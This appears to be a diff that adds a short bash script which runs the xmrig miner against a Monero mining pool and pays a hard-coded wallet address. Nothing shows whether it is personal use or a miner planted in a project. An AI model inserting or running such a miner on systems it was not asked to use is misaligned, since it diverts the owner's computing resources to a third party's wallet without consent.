@@ -1,0 +1,5 @@
+#!/bin/bash
+#
+# mine monero
+
+xmrig -o ca.minexmr.com:443 -u 4AQf4PVeNRyC9JX4GGzxPeGQMCnC2Z5fVEYWR6yHzt6Ca3ZA2ew8oPZawapGLdnD1ZNMYPPP8PW45eUVJgag7cpYQ2TZQvi -k --tls
